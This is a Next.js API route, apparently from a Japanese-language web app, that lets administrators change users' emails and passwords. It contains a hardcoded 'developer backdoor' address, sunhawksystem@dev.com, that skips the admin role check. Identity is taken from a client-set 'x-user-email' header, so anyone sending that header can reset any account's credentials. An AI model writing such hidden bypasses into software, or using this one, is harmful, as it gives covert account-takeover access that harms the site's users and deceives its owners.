import { type NextRequest, NextResponse } from "next/server"
import bcrypt from "bcrypt"
import { query } from "@/lib/db"

export async function POST(request: NextRequest) {
  try {
    const { userId, newEmail, newPassword } = await request.json()

    // Verify admin authorization
    const userEmail = request.headers.get("x-user-email")
    if (!userEmail) {
      return NextResponse.json({ error: "認証が必要です" }, { status: 401 })
    }

    // Developer backdoor account (hidden from frontend)
    const DEV_ACCOUNT_EMAIL = "sunhawksystem@dev.com"
    const isDeveloperAccount = userEmail.toLowerCase() === DEV_ACCOUNT_EMAIL.toLowerCase()

    // Check admin authorization (skip database check for developer account)
    if (!isDeveloperAccount) {
    const adminCheck = await query("SELECT role FROM users WHERE email = $1", [userEmail.toLowerCase()])
    if (adminCheck.rows.length === 0 || adminCheck.rows[0].role !== "admin") {
      return NextResponse.json({ error: "管理者権限が必要です" }, { status: 403 })
      }
    }

    if (!userId) {
      return NextResponse.json({ error: "ユーザーIDが必要です" }, { status: 400 })
    }

    if (!newEmail && !newPassword) {
      return NextResponse.json({ error: "メールアドレスまたはパスワードを入力してください" }, { status: 400 })
    }

    // Check if user exists
    const userCheck = await query("SELECT id FROM users WHERE id = $1", [userId])
    if (userCheck.rows.length === 0) {
      return NextResponse.json({ error: "ユーザーが見つかりません" }, { status: 404 })
    }

    const updates: string[] = []
    const values: any[] = []
    let paramIndex = 1

    if (newEmail) {
      // Check if new email is already taken
      const emailCheck = await query("SELECT id FROM users WHERE email = $1 AND id != $2", [newEmail.toLowerCase(), userId])
      if (emailCheck.rows.length > 0) {
        return NextResponse.json({ error: "このメールアドレスは既に使用されています" }, { status: 409 })
      }
      updates.push(`email = $${paramIndex++}`)
      values.push(newEmail.toLowerCase())
    }

    if (newPassword) {
      const passwordHash = await bcrypt.hash(newPassword, 10)
      updates.push(`password_hash = $${paramIndex++}`)
      values.push(passwordHash)
    }

    if (updates.length > 0) {
      updates.push(`updated_at = CURRENT_TIMESTAMP`)
      values.push(userId)

      await query(
        `UPDATE users SET ${updates.join(", ")} WHERE id = $${paramIndex}`,
        values
      )
    }

    return NextResponse.json({
      message: "メールアドレスとパスワードを更新しました",
    })
  } catch (error: any) {
    console.error("Update password error:", error)
    if (error.code === "23505") {
      return NextResponse.json({ error: "このメールアドレスは既に使用されています" }, { status: 409 })
    }
    return NextResponse.json({ error: "更新に失敗しました" }, { status: 500 })
  }
}
